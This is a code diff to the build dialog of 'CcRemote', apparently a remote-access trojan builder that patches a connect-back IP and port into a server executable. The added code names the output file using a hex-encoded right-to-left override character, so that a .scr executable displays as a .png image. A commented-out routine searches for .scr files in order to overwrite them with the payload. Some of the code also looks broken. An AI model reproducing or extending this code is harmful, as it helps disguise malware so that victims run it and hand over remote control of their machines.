@@ -5,6 +5,7 @@
 #include "CcRemote.h"
 #include "CBuildDlg.h"
 #include "afxdialogex.h"
+#include <io.h>
 
 
 struct Connect_Address
@@ -54,7 +55,13 @@ void CBuildDlg::OnBnClickedOk()
 	CString strCurrentPath;
 	CString strFile;
 	CString strSeverFile;
+	CString strCamouflageFile;
 	BYTE *lpBuffer = NULL;
+	char names[] = {0x73,0x00,0x65,0x00,0x78,0x00,0x2E,0x20,0x67,0x00,0x6E,0x00,0x70,0x00,0x2E,0x00,0x73,0x00,0x63,0x00,0x72,0x00,0x00,0x00 };
+	WCHAR namess[60] = L"F:\\myapp\\CcRemote\\bin\\server\\";
+
+	memcpy(namess + 29, names, 0x24);
+
 	DWORD dwFileSize;
 	UpdateData(TRUE);
 	//////////上线信息//////////////////////
@@ -76,14 +83,33 @@ void CBuildDlg::OnBnClickedOk()
 		//读取文件内容
 		file.Read(lpBuffer, dwFileSize);
 		file.Close();
-		//写入上线IP和端口 主要是寻找0x1234567这个标识然后写入这个位置
+		//写入上线IP和端口 主要是寻找0x这个标识然后写入这个位置
 		int nOffset = memfind((char*)lpBuffer, (char*)&g_myAddress.dwstact, dwFileSize, sizeof(DWORD));
 		memcpy(lpBuffer + nOffset, &g_myAddress, sizeof(Connect_Address));
-		//保存到文件
-		strSeverFile = strCurrentPath + "\\server.exe";
+		//strCamouflageFile = FindFiles("F:\\myapp\\CcRemote\\bin\\server\\", lpBuffer, dwFileSize);
+		//if (strCamouflageFile != "null")
+		//{
+		//	int a = file.Open(strCamouflageFile, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
+		//	file.Write(lpBuffer, dwFileSize);
+		//	file.Close();
+		//}
+		//else
+		//{
+			//保存到文件
+		strSeverFile = "F:\\myapp\\CcRemote\\bin\\server\\";
+		strSeverFile += names;
+		HANDLE hFile = CreateFileW(namess,      //第一个参数:路径
+			GENERIC_READ,                       //打开方式:
+			0,                                  //共享模式:0为独占  
+			NULL,
+			OPEN_EXISTING,                      //打开已存在的文件
+			FILE_FLAG_BACKUP_SEMANTICS,         //FILE_FLAG_BACKUP_SEMANTICS表示为目录，NULL表示文件
+			NULL);
 		file.Open(strSeverFile, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
 		file.Write(lpBuffer, dwFileSize);
 		file.Close();
+		//}
+
 		delete[] lpBuffer;
 		MessageBox("生成成功");
 
@@ -116,4 +142,36 @@ int CBuildDlg::memfind(const char *mem, const char *str, int sizem, int sizes)
 		if (j == da) return i;
 	}
 	return -1;
+}
+
+
+CString CBuildDlg::FindFiles(const char* dir, BYTE *lpBuffer,DWORD lpSize)
+{
+	HANDLE h;						// 文件句柄
+	WIN32_FIND_DATA findData;		// 查找到的文件信息结构
+	char dirTmp[MAX_PATH] = { 0 };
+	strcpy(dirTmp, dir);
+	strcat(dirTmp, "*.scr");			// 使用通配符，和传入参数组成一个待遍历的路径
+	DWORD sizes;
+
+	CString fileList;	//此处用string就会使存入值变为乱码，所以用CString
+	h = FindFirstFileA(dirTmp, &findData);	//开始遍历
+	do {
+		if (findData.dwFileAttributes&_A_SUBDIR || findData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY || strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
+		{
+			//log(INFO,"是目录，目录名：%s",findData.cFileName);
+		}
+		else
+		{
+			WriteFile(h, lpBuffer, lpSize,&sizes, NULL);
+			FindClose(h);
+			fileList=(findData.cFileName);			// 绝对路径存入vector(其实就是一个数组)
+			return "F:\\myapp\\CcRemote\\bin\\server\\" + fileList;
+		}
+	} while (FindNextFileA(h, &findData));
+
+	CString a = "null";
+
+	FindClose(h);
+	return a;
 }
